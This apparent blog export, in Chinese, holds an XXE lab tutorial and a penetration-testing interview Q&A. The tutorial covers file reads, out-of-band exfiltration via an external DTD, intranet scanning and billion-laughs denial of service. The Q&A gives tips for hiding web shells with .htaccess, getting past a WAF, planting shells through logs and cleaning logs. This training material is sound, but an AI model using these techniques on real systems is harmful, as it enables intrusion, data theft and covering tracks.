声明一个外部实体的关键在于“SYSTEM”这个关键字。SYSTEM在此意图让xml解析器知道，现在声明的是一个外部实体，需要从后面的外部资源中获取内容并存储在内部实体，如果后面的外部资源的语法，存在特殊符号，那么xml解析器会报错。      外部实体引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，比如http、file、ftp等，具体内容如下所示：                  外部实体引用示例：<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE books [     <!ENTITY xxe SYSTEM "http://localhost/xmltest.txt"> ]&gt;  <books>&xxe;</books>      依旧将代码作为参数传入：            另外，从实体的引用方式来区分，实体又可以分为：一般实体、参数实体、预定义实体。      一般实体：General Entities，就是我们上面的示例中的实体，使用&amp;进行引用      预定义实体：PredefinedEntities，就是xml本身对一些特殊字符进行了预定义，方便用户直接引用，比如小于号，如果直接在xml文档中使用小于号，会被xml解析器视为标签，从而引起解析错误。那么此时就需要调用小于号所对应的预定义实体来引用：&amp;#x3C。      参数实体：Parameter Entities，这也是XXE学习中的重点，在XXE利用中经常被使用。3）参数实体      参数实体声明：内部：<!ENTITY % 实体名称 "实体值"> 外部：<!ENTITY % 实体名称 SYSTEM  "URI">      参数实体应注意以下几点：      (1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 “%实体名;” 引用      (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体      (3)和通用实体一样，参数实体也可以外部引用      简单理解呢，就是参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在当前xml文件的DTD声明中，或者是当前的DTD文件中。      参数实体引用示例：<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE books [     <!ENTITY % xxe "hello">     %xxe;  ]&gt;  <books></books>      那么它的引用效果是什么样的呢？我们拿下面这示例讲解一下：            像上图这样一个xml文档，我们定义了一个参数实体为test，他的值比较特殊，是一句普通实体的声明，然后是使用“%test”进行引用，最后在xml文档内容中使用“&amp;hello”来引用定义的普通实体hello。      那么此文档中实体的定义其实就成为了下图所示的：            所以这个时候，我们直接使用浏览器查看的时候，会是下面的显示：      </p>
<p>实验步骤二</p>
<p><strong>任务描述：有回显的本地文件读取。</strong></p>
<p>   漏洞示例代码：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/1eee747b-b70b-46e5-98d7-5980ae71014f.png" alt="img"></p>
<p>   测试payload：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/5ef5ec0a-2adb-4a9f-8af6-b3131204bafe.png" alt="img"></p>
<p>   在浏览器中设置代理，打开burpsuite访问存在漏洞的页面：“xxetest.php”，并抓包，然后发送到Repeater中，构造请求包：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/62d3bd12-eefa-4b0c-9157-2e3e21f9c8a9.png" alt="img"></p>
<p>   这样我们就读取到了windows系统的system.ini的文件内容。</p>
<p>   但是这样也不代表这个payload的就适用于任何情况，比如我们更换一个读取的文件xmltest2.txt，内容是：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/bb5ba17f-5f4c-44ed-8c3d-12ca72690c4b.png" alt="img"></p>
<p>   我们再使用刚才的payload测试：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/48198e19-ef71-45f6-9026-dc63e706473b.png" alt="img"></p>
<p>   这个时候就会如上图一样，报很多错误，主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础巩固中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。所以我们的问题是：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/52bacae0-48d7-486d-a49c-09df72c68213.png" alt="img"></p>
<p>   所以我们就要想办法绕过。这个时候我们就需要了解一下XML CDATA了，我们先看一下w3school中对他的描述：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/09be709a-34bd-4832-a7f9-3f94abd208e9.png" alt="img"></p>
<p>   其实只用看一个开始，我们就大概知道CDATA的作用了，它可以使得使用其中的数据内容不会被xml解析器解析。然后我们再看其使用方式：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/7c01d25c-9bf6-42f2-b99f-31c4503bbe41.png" alt="img"></p>
<p>   从w3school给出的例子，我们也大概知道了CDATA的使用方式，但是其还需要注意几点：</p>
<p>   a. CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。</p>
<p>   b. 标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或换行。</p>
<p>   那么了解了这些，我们就可以尝试使用CDATA再次去读取目标文件的内容，我们首先需要把要读取的到的内容放在CDATA中，但是CDATA并没有提供拼接的方法，所以我们暂且使用普通实体进行拼接尝试（注意是尝试）：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/55dfd86c-a46f-4b65-a34e-dc60e2e1067c.png" alt="img"></p>
<p>   我们尝试直接使用实体来进行拼接，但是测试失败：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/eba2fc1b-faba-4170-a75b-3eeb6f314848.png" alt="img"></p>
<p>   这说明我们的拼接方式不可行，我们现在使用的是一般实体，我们在前面的xml基础知识中介绍过了，一般实体的引用是在xml文档内容中，既然在xml文档内容中拼接不可行，那再dtd中拼接可行吗？我们再次进行尝试，既然再dtd中拼接，那就需要用到参数实体了。</p>
<p>   我们再次尝试构造payload：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/c954ed86-0f20-455b-952d-d3effc5315cb.png" alt="img"></p>
<p>   理论上，我们完美地将这几个参数实体拼接了起来，并将值赋给了一般实体all，但是遗憾的是，我们的payload还是报错了：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/697e6d68-cfc4-409e-ad82-c3dc3aa1d976.png" alt="img"></p>
<p>   那么这又是为什么呢？根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语言中”，这是什么意思呢？就是不能在实际的标记语言中来调用参数实体，像我们这样，就是在标记语言中进行调用：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/34c0d65e-ffa5-4fed-8683-3cd86c03e5dd.png" alt="img"></p>
<p>   但可以在同级别中被当作标记语言调用，就像是参数实体的引用，就是将调用当成了一个标记语言，像这样：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/b774add3-adcb-40f6-aaca-3ff855c40b12.png" alt="img"></p>
<p>   也就是我们所构造的payload这种使用方式，不能在内部DTD中被这样使用，但是幸运的是，XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/6a2604c2-cbbe-4f48-95e5-166e1f55a265.png" alt="img"></p>
<p>   DTD文件的内容：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/7395ec9a-0c90-4e4e-8438-21f6b2fdcf24.png" alt="img"></p>
<p>   我们再次进行攻击尝试，成功读取到文件内容：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/26fb0f38-26b6-4c06-927a-408344b98a45.png" alt="img"></p>
<p>   Ps：</p>
<p>   由于环境资源的关系，我们在进行攻击时，所使用的外部dtd文件，是本地环境的。但是在实际的攻击情况下，这个DTD文件应该是我们自己所掌握的主机的DTD文件，文件的内容是受我们所控的。</p>
<p>实验步骤三</p>
<p><strong>任务描述：无回显的本地文件读取。（OOB out-of-band 外带参数实体注入）</strong></p>
<p>   但是，在实际情况中，大多数情况下服务器上的 XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据</p>
<p>   先看一下漏洞示例：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/7dcb17ef-c08c-45a9-bbb8-ba93a5e804fc.png" alt="img"></p>
<p>   相较于前面有回显的漏洞代码，我们去掉了内容输出的一部分。这样，用之前的payload就没有作用了：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/c2d92a7e-2922-46ef-996c-a83e5082996d.png" alt="img"></p>
<p>   Payload的构造：</p>
<p>   有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：</p>
<p>   我们可以在本地做一个端口监听，然后利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口，这样，我们只需要查看请求的url就可以知道读取到的内容是什么。</p>
<p>   首先，我们使用ncat监听一个端口：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/f566822d-7958-4286-a26f-058a03b54396.png" alt="img"></p>
<p>   然后，我们构造payload：</p>
<p>   我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/1e248208-e22e-4699-a596-6d7aa97c64a4.png" alt="img"></p>
<p>   我们注意到，第一个参数实体的声明中使用到了php的base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。</p>
<p>   Payload如下：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/456b6b3b-eb39-452f-8972-8ee7c08504b7.png" alt="img"></p>
<p>   如图，我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。</p>
<p>   开始攻击：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/77c3abc6-803e-48fe-9206-3cd05ad93eff.png" alt="img"></p>
<p>   然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/691fa5ff-fffa-4f83-847a-b0fa9a56ce94.png" alt="img"></p>
<p>   Ps：</p>
<p>   有时候也会出现报错的情况（这是我们在漏洞的代码中没有屏蔽错误和警告），比如我们这里的payload没有选用php的base64编码，这里报错了，但是同时也将所读取的内容爆了出来，只是特殊字符经过了HTML实体编码。</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/d6ccf386-311e-47cf-bb33-1474de7607be.png" alt="img"></p>
<p>实验步骤四</p>
<p><strong>任务描述：XXE的其他攻击方式</strong></p>
<p>\1.  通过XXE漏洞进行内网探测</p>
<p>   当然进行内网探测我们还需要做一些准备工作，就是获取目标主机在内网中的IP地址，或是内网的网络划分信息，我们可以先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 等跟内网配置有关的文件，我们可以通过这些文件的内容来获取更多有关内网的信息。</p>
<p>   如果实在没有办法获取目标主机的内网配置相关信息，那就花费时间爆破吧。</p>
<p>   内网存活主机探测：</p>
<p>   如下，其实payload就是简单的一个外部实体的注入payload：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/f83bf300-9faa-4016-bc97-d52a706413fb.png" alt="img"></p>
<p>   只不过是将http://后面的部分替换为目标主机：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/59dc2d2f-112d-446a-b82f-071e02944229.png" alt="img"></p>
<p>   就像这样，如果目标主机对应的端口开启了http服务，或是其他服务，如ftp，也是可以通过http协议来访问，这样根据目标主机的响应内容或者状态码，就可以判断主机的存活与否，根据这个原理，我们在网上找到了相应的py脚本：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/259c1db0-199a-44c1-b53a-f894ffe58164.png" alt="img"></p>
<p>   运行该脚本就能够找出相应网段是否存在开启http服务的主机。</p>
<p>\2. 内网主机端口探测：</p>
<p>   同样的，根据内网存活主机的扫描方式，我们也可以针对某个主机进行端口的扫描：</p>
<p>   构造payload：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/fe5bffe9-24e0-4640-9a92-1fc9cc22f639.png" alt="img"></p>
<p> 扫描的大概原理是这样的：</p>
<p>   比如你扫描一个关闭的端口，在等待了一段时间后，返回协议连接失败且超过了最长时间限制30秒：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/83402012-6a0e-490a-9d00-2a88b8454bfd.png" alt="img"></p>
<p>   而你扫描开放的端口，也可能是内容错误等其他的警告信息：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/994f9089-8813-49d1-8c07-2513943ee5cc.png" alt="img"></p>
<p>   Ps：<br>   有时候，端口扫描时判断端口的开放和关闭并不是虚拟机中这个样子，由于环境的不同，版本的不同，你可能会遇到的状况是：关闭的端口在超时之后，返回的是500状态码。</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/2a332634-873b-4c35-a1e2-6f0e79389024.png" alt="img"></p>
<p>   而开放的端口，返回的是200的状态码，以及一些xml警告信息，有时候还会附带上我们payload中期望输出的字符串。</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/ff60e8d0-0fd1-49bf-9b6e-10aa424cb278.png" alt="img"></p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/631b5aff-664b-433d-8b1a-cfa55cf7a299.png" alt="img"></p>
<p>   所以，在进行内网探测时，探测结果判定的依据，还需要你自己来判断。你可以是根据返回状态码，也可以是根据返回的警告信息的内容，又或者你也可以尝试根据返回信息的时间长短。（我们在实验中就不写了，当然你也可以想办法，将扫描存活主机与端口同时进行，我觉得这样准确率反而会更高一些，就是速度会很慢）。</p>
<p>\3. 通过XXE漏洞进行命令执行（非本实验重点）</p>
<p>   这种情况比较少见，所需的前提条件除了真实存在XXE漏洞外，大概还需要：</p>
<p>   a. 目标系统为Linux系统</p>
<p>   b. 目标系统成功安装PHP的expect扩展</p>
<p>   而且这个漏洞所执行的命令也有限制：</p>
<p>   a. 可执行的命令与当前用户的权限大小有关</p>
<p>   b. 命令中不能有空格，否则会报错</p>
<p>   一般情况下payload（实验环境限制，我没有测试，大家可以在自己的本地搭建环境测试）：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/989eff00-1bed-41d4-a6a7-295abd86a03f.png" alt="img"></p>
<p>\4.  通过XXE漏洞进行DOS攻击（不要轻易尝试）。</p>
<p>   Payload如下：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/ec49e4f9-78b2-4b97-a60a-0c98b05df919.png" alt="img"></p>
<p>   上面的payload就是著名的“billionlaughs”攻击，该代码可以在目标主机的内存中生成十亿个“lol”字符串，从而导致 Dos攻击。它也被称为指数实体扩展攻击，是一种名副其实的XML炸弹。原理为：通过创建一项递归的 XML 定义，构造恶意的XML实体文件耗尽可用内存，如以上代码所示，在XMl中定义了一个实体lol9，它的值包含了十个实体lol8的值，而每个lol8又包含了十个lol7的值…最后产生10亿个“lol”字符串，占用内存约高达3GB。因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，这样，就会占用大量的内存资源，造成了拒绝服务器攻击。</p>
<p>实验报告要求</p>
<p>参考实验原理与相关介绍，完成实验任务，并对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<p>分析与思考</p>
<p><strong>XXE的防御：</strong></p>
<p>方案一：</p>
<p>过滤用户输入的xml数据，比如尖括号，一些关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC等</p>
<p>方案二：</p>
<p>禁用外部实体：<br>PHP：</p>
<p>libxml_disable_entity_loader(true)<em>;</em></p>
<p>JAVA:</p>
<p>DocumentBuilderFactorydbf =DocumentBuilderFactory.<strong>new**</strong>Instance**();</p>
<p>dbf.setExpandEntityReferences(false);</p>
<p>Python：</p>
<p><strong>from</strong> lxml import etree</p>
<p>xmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
<p>另外，可以自己研究一下php的其他协议在xxe注入中的使用，比如，读取本地文件的时候，如果文件过大，可能会报错，那么这个时候就可以使用php的某个协议对文件的内容进行压缩……（自己思考研究）</p>
<p>配套学习资源</p>
<p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
<p><a href="https://blog.csdn.net/lileiyuyanqin/article/details/72828922">https://blog.csdn.net/lileiyuyanqin/article/details/72828922</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
<p><a href="https://www.freebuf.com/column/156863.html">https://www.freebuf.com/column/156863.html</a></p>
<p><a href="https://www.freebuf.com/column/208904.html">https://www.freebuf.com/column/208904.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/126788.html">https://www.freebuf.com/articles/web/126788.html</a></p>
<p><a href="https://www.freebuf.com/vuls/194112.html">https://www.freebuf.com/vuls/194112.html</a></p>
<p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html">https://www.cnblogs.com/r00tuser/p/7255939.html</a></p>
<p><a href="https://www.freebuf.com/column/188849.html">https://www.freebuf.com/column/188849.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>渗透测试面试问题合集</title>
    <url>/2020/08/08/mianshi/</url>
    <content><![CDATA[<h1 id="渗透测试面试问题合集"><a href="#渗透测试面试问题合集" class="headerlink" title="渗透测试面试问题合集"></a>渗透测试面试问题合集</h1><h2 id="一、思路流程"><a href="#一、思路流程" class="headerlink" title="一、思路流程"></a>一、思路流程</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>a、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</p>
<p>b、网站指纹识别（包括，cms，cdn，证书等），dns记录</p>
<p>c、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p>
<a id="more"></a>

<p>e、子域名收集，旁站，C段等</p>
<p>f、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</p>
<p>g、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</p>
<p>h、传输协议，通用漏洞，exp，github源码等</p>
<h3 id="2、漏洞挖掘"><a href="#2、漏洞挖掘" class="headerlink" title="2、漏洞挖掘"></a>2、漏洞挖掘</h3><p>a、浏览网站，看看网站规模，功能，特点等</p>
<p>b、端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心zang出血，mysql,ftp,ssh弱口令等。</p>
<p>c、XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p>
<h3 id="3、漏洞利用-amp-权限提升"><a href="#3、漏洞利用-amp-权限提升" class="headerlink" title="3、漏洞利用&amp;权限提升"></a>3、漏洞利用&amp;权限提升</h3><p>a、mysql提权，serv-u提权，oracle提权</p>
<p>b、windows 溢出提权</p>
<p>c、linux脏牛,内核漏洞提权e</p>
<h3 id="4、清除测试数据-amp-输出报告"><a href="#4、清除测试数据-amp-输出报告" class="headerlink" title="4、清除测试数据&amp;输出报告"></a>4、清除测试数据&amp;输出报告</h3><p>日志、测试数据的清理<br>总结，输出渗透测试报告，附修复方案</p>
<h3 id="5、复测"><a href="#5、复测" class="headerlink" title="5、复测"></a>5、复测</h3><p>验证并发现是否有新漏洞，输出报告，归档</p>
<h2 id="二、问题"><a href="#二、问题" class="headerlink" title="二、问题"></a>二、问题</h2><h3 id="1、拿到一个待检测的站，你觉得应该先做什么？"><a href="#1、拿到一个待检测的站，你觉得应该先做什么？" class="headerlink" title="1、拿到一个待检测的站，你觉得应该先做什么？"></a>1、拿到一个待检测的站，你觉得应该先做什么？</h3><p>信息收集<br>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
<p>b、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p>
<p>c、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p>
<p>d、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心zang出血，mysql,ftp,ssh弱口令等。</p>
<p>e、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>f、google hack 进一步探测网站的信息，后台，敏感文件</p>
<p>漏洞扫描<br>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
<p>漏洞利用<br>利用以上的方式拿到webshell，或者其他权限</p>
<p>权限提升<br>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
<p>日志清理</p>
<p>总结报告及修复方案</p>
<h3 id="2、判断出网站的CMS对渗透有什么意义？"><a href="#2、判断出网站的CMS对渗透有什么意义？" class="headerlink" title="2、判断出网站的CMS对渗透有什么意义？"></a>2、判断出网站的CMS对渗透有什么意义？</h3><p>查找网上已曝光的程序漏洞。</p>
<p>如果开源，还能下载相对应的源码进行代码审计。</p>
<h3 id="3-一个成熟并且相对安全的CMS，渗透时扫目录的意义？"><a href="#3-一个成熟并且相对安全的CMS，渗透时扫目录的意义？" class="headerlink" title="3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？"></a>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</h3><p>敏感文件、二级目录扫描</p>
<p>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
<h3 id="4-常见的网站服务器容器。"><a href="#4-常见的网站服务器容器。" class="headerlink" title="4.常见的网站服务器容器。"></a>4.常见的网站服务器容器。</h3><p>IIS、Apache、nginx、Lighttpd、Tomcat</p>
<h3 id="5-mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？"><a href="#5-mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？" class="headerlink" title="5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？"></a>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</h3><p>root权限以及网站的绝对路径。</p>
<h3 id="6-目前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#6-目前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="6.目前已知哪些版本的容器有解析漏洞，具体举例。"></a>6.目前已知哪些版本的容器有解析漏洞，具体举例。</h3><p>a、IIS 6.0<br>/xx.asp/xx.jpg “xx.asp”是文件夹名</p>
<p>b、IIS 7.0/7.5<br>默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p>
<p>c、Nginx<br>版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg.php</p>
<p>d、Apache 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
<p>e、lighttpd xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！</p>
<h3 id="7-如何手工快速判断目标站是windows还是linux服务器？"><a href="#7-如何手工快速判断目标站是windows还是linux服务器？" class="headerlink" title="7.如何手工快速判断目标站是windows还是linux服务器？"></a>7.如何手工快速判断目标站是windows还是linux服务器？</h3><p>linux大小写敏感,windows大小写不敏感。</p>
<h3 id="8-为何一个mysql数据库的站，只有一个80端口开放？"><a href="#8-为何一个mysql数据库的站，只有一个80端口开放？" class="headerlink" title="8.为何一个mysql数据库的站，只有一个80端口开放？"></a>8.为何一个mysql数据库的站，只有一个80端口开放？</h3><p>更改了端口，没有扫描出来。</p>
<p>站库分离。</p>
<p>3306端口不对外开放</p>
<h3 id="9、3389无法连接的几种情况"><a href="#9、3389无法连接的几种情况" class="headerlink" title="9、3389无法连接的几种情况"></a>9、3389无法连接的几种情况</h3><p>没开放3389 端口<br>端口被修改<br>防护拦截<br>处于内网(需进行端口转发)</p>
<h3 id="10-如何突破注入时字符被转义？"><a href="#10-如何突破注入时字符被转义？" class="headerlink" title="10.如何突破注入时字符被转义？"></a>10.如何突破注入时字符被转义？</h3><p>宽字符注入<br>hex编码绕过</p>
<h3 id="11-在某后台新闻编辑界面看到编辑器，应该先做什么？"><a href="#11-在某后台新闻编辑界面看到编辑器，应该先做什么？" class="headerlink" title="11.在某后台新闻编辑界面看到编辑器，应该先做什么？"></a>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</h3><p>查看编辑器的名称版本,然后搜索公开的漏洞。</p>
<h3 id="12-拿到一个webshell发现网站根目录下有-htaccess文件，我们能做什么？"><a href="#12-拿到一个webshell发现网站根目录下有-htaccess文件，我们能做什么？" class="headerlink" title="12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？"></a>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</h3><p>能做的事情很多，用隐藏网马来举例子：<br>插入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>

<p>.jpg文件会被解析成.php文件。</p>
<p>具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
<h3 id="13-注入漏洞只能查账号密码？"><a href="#13-注入漏洞只能查账号密码？" class="headerlink" title="13.注入漏洞只能查账号密码？"></a>13.注入漏洞只能查账号密码？</h3><p>只要权限广，拖库脱到老。</p>
<h3 id="14-安全狗会追踪变量，从而发现出是一句话木马吗？"><a href="#14-安全狗会追踪变量，从而发现出是一句话木马吗？" class="headerlink" title="14.安全狗会追踪变量，从而发现出是一句话木马吗？"></a>14.安全狗会追踪变量，从而发现出是一句话木马吗？</h3><p>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
<h3 id="15-access-扫出后缀为asp的数据库文件，访问乱码，-如何实现到本地利用？"><a href="#15-access-扫出后缀为asp的数据库文件，访问乱码，-如何实现到本地利用？" class="headerlink" title="15.access 扫出后缀为asp的数据库文件，访问乱码，**如何实现到本地利用？"></a>15.access 扫出后缀为asp的数据库文件，访问乱码，**如何实现到本地利用？</h3><p>迅雷下载，直接改后缀为.mdb。</p>
<h3 id="16-提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#16-提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="16.提权时选择可读写目录，为何尽量不用带空格的目录？"></a>16.提权时选择可读写目录，为何尽量不用带空格的目录？</h3><p>因为exp执行多半需要空格界定参数</p>
<h3 id="17-某服务器有站点A-B-为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？"><a href="#17-某服务器有站点A-B-为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？" class="headerlink" title="17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？"></a>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</h3><p>同数据库。</p>
<h3 id="18-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？"><a href="#18-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？" class="headerlink" title="18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？"></a>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</h3><p>and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
<h3 id="19-某个防注入系统，在注入时会提示："><a href="#19-某个防注入系统，在注入时会提示：" class="headerlink" title="19:某个防注入系统，在注入时会提示："></a>19:某个防注入系统，在注入时会提示：</h3><p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p>
<h3 id="20、如何利用这个防注入系统拿shell？"><a href="#20、如何利用这个防注入系统拿shell？" class="headerlink" title="20、如何利用这个防注入系统拿shell？"></a>20、如何利用这个防注入系统拿shell？</h3><p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
<h3 id="21-上传大马后访问乱码时，有哪些解决办法？"><a href="#21-上传大马后访问乱码时，有哪些解决办法？" class="headerlink" title="21.上传大马后访问乱码时，有哪些解决办法？"></a>21.上传大马后访问乱码时，有哪些解决办法？</h3><p>浏览器中改编码。</p>
<h3 id="22-审查上传点的元素有什么意义？"><a href="#22-审查上传点的元素有什么意义？" class="headerlink" title="22.审查上传点的元素有什么意义？"></a>22.审查上传点的元素有什么意义？</h3><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
